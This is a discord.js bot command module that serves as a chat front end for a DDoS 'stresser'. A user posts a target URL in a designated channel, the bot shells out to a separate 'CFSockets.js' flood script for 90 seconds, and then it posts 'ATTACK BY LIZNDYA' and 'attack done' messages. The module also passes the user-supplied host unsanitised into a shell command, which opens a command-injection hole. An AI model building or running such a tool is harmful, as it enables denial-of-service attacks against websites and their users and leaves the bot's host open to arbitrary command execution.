const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CFSockets')
	.setDescription("`example .CFSockets https://example.com/`")
	.setFooter("don't attack website .gov .edu")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node CFSockets.js ${host} 90`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Loading Please Wait** 🚀')
	.setTimestamp()
	.setDescription("**► attack done 💥**")
	.setFooter('© Developer: ROMEO', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 90000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ATTACK BY LIZNDYA** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `CFSockets` \n **𝐓𝐢𝐦𝐞**: `90`")	
  .setFooter('© Developer: ROMEO', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['CFSockets'],
  permLevel: 0
}

exports.help = {
  name: 'CFSockets',
  description: 'VenThings',
  usage: 'CFSockets'
}
